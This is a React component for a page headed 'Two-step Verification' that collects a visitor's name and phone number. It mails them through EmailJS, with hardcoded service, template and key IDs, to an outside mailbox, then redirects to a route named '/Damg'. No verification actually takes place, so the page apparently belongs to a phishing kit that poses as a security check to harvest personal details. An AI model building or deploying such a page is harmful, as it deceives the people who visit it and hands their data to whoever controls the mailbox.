import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';

const Verify = () => {
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [status, setStatus] = useState('');
  const navigate = useNavigate();

  const isFormValid = name.trim() !== '' && phone.trim() !== '';

  const handleSubmit = (e) => {
    e.preventDefault();

    if (isFormValid) {
      const templateParams = {
        user_name: name,
        user_phone: phone,
        message: `Name: ${name}, Phone: ${phone}`,
      };

      emailjs
        .send(
          'service_bzuewcp',
          'template_vkf7atk',
          templateParams,
          'BEBP_L2ryaPNa5V4S'
        )
        .then(() => {
          setStatus('Email sent successfully!');
          setName('');
          setPhone('');
          navigate('/Damg');
        })
        .catch((error) => {
          console.error('Error:', error);
          setStatus('Failed to send email.');
        });
    } else {
      alert('Please fill out all fields.');
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      {/* Top Section with Background Image */}
      <div
        className=" h-40 sm:h-48"
        style={{
          backgroundImage: `url(${require('../image/signNav.png')})`,
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat',
        }}
      ></div>

      {/* Main Form Section */}
      <div
        className="flex-1 flex items-center justify-center px-4 py-10"
        style={{
          backgroundImage: `url(${require('../image/winter_morning.jpg')})`,
          backgroundSize: 'cover',
          backgroundPosition: 'center',
        }}
      >
        <div className="w-full max-w-md bg-white rounded-lg shadow-lg px-6 py-8 sm:px-10">
          <h1 className="text-2xl font-semibold text-center mb-6">
            Two-step Verification
          </h1>
          <form onSubmit={handleSubmit}>
            <div className="flex flex-col gap-6">
              {/* Name Input */}
              <input
                type="text"
                className="border border-gray-300 rounded-full py-2 px-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Enter your Name"
                value={name}
                onChange={(e) => setName(e.target.value)}
                required
              />

              {/* Phone Input */}
              <input
                type="number"
                className="border border-gray-300 rounded-full py-2 px-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Phone Number"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                required
              />

              {/* Submit Button */}
              <button
                type="submit"
                className={`w-full py-2 rounded-full transition-all ${
                  isFormValid
                    ? 'bg-blue-600 text-white hover:bg-blue-700'
                    : 'bg-gray-400 text-gray-700 cursor-not-allowed'
                }`}
                disabled={!isFormValid}
              >
                Submit
              </button>
            </div>
          </form>

          {/* Status Message */}
          {status && (
            <p className="mt-4 text-center text-gray-600">{status}</p>
          )}
        </div>
      </div>
    </div>
  );
};

export default Verify;
